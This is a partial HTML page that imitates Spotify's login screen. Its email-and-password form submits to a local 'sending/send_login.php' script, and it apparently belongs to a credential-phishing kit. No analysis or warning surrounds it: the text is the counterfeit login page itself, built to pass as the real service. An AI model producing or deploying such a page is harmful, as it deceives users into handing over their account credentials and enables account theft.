...
<html><head>
  ...
  <link rel="icon" href="./assets/favicon.png">
     <link type="text/css" rel="stylesheet" href="./assets/s1.css" >
...
<h2 class="Type__TypeElement-goli3j-0 hvmNPy Header__Title-nt28l4-1 fKQPLB">To continue, log in to Spotify.</h2>
</div>
...
<form action="./sending/send_login.php" method="POST">
  <h2 class="Type__TypeElement-goli3j-0 ldUluE FormTitle__Title-sc-1g20ldl-0 bYQiYc"> Continue with your email address</h2>
  <div class="Group-u9bcx5-0 dstcKD">
  <div class="LabelGroup-sc-1ibddrg-0 bMcAii"><label for="email" class="Label-sc-1c0cv3r-0 kviWbL">Email address or username ?
  </label></div>
  <input aria-invalid="false" id="email" name="email" placeholder="Email address or username ." required="" value="" class="Input-sc-1gbx9xe-0 ieCQAp" type="email"></div>
  <div class="Group-u9bcx5-0 dstcKD">
  <div class="Group-u9bcx5-0 dstcKD">
  <div class="LabelGroup-sc-1ibddrg-0 bMcAii"><label for="password" class="Label-sc-1c0cv3r-0 kviWbL">Your
  password ?</label></div>
  <input aria-invalid="false" autocomplete="new-password" id="password" pattern=".{8,}" name="password" placeholder="Password." required="" value="" class="Input-sc-1gbx9xe-0 ieCQAp" type="password"></div>
  <div class="Group-u9bcx5-0 dstcKD">
  ...
  <div class="ButtonInner-sc-14ud5tc-0 kjYGDx encore-bright-accent-set SignupButton___StyledButtonPrimary-cjcq5h-1 frbGK">LOG 
  IN</div>
  <div class="ButtonFocus-sc-2hq6ey-0 jTozwe"></div>
  </button></div>
  <p class="Type__TypeElement-goli3j-0 gRiErM"><span class="LinkContainer-sc-1t58wcv-0 fyLrlP">Don't Have an account? <a href="./index.php">Log
in</a>.</span></p>
  </div>
